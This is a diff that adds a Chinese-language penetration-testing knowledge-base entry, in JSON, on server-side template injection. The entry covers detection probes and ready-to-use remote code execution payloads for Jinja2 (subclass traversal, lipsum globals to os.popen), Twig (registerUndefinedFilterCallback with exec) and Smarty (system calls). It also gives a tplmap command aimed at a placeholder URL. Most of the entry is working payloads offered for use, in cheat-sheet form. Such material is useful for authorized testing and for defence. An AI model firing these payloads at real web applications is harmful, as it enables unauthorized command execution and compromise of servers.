@@ -1,0 +1,15 @@
+{
+  "id": "kb004",
+  "title": "SSTI 模板注入",
+  "description": "Jinja2/Twig/Smarty 检测三元组与利用",
+  "detail": "检测：{7*7} → 49 (Jinja2/Twig?)，{{7*'7'}} → 7777777 (Jinja2)，49 (Twig)。\nJinja2: {{config}} 看配置；RCE:\n{{''.__class__.__mro__[1].__subclasses__()}} 找 os._wrap_close / Popen\n或 lipsum.__globals__['os'].popen('id').read()\nTwig: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}\nSmarty: {system('id')} / {if system('id')}{/if}\ntplmap -u 可自动化。Python 沙箱逃逸查 attr/globals 链。",
+  "commands": [
+    "tplmap -u 'http://T/?name='"
+  ],
+  "tags": [
+    "web",
+    "ssti"
+  ],
+  "source": "经验/PayloadsAllTheThings",
+  "created_at": "2026-10-15T13:44:05Z"
+}
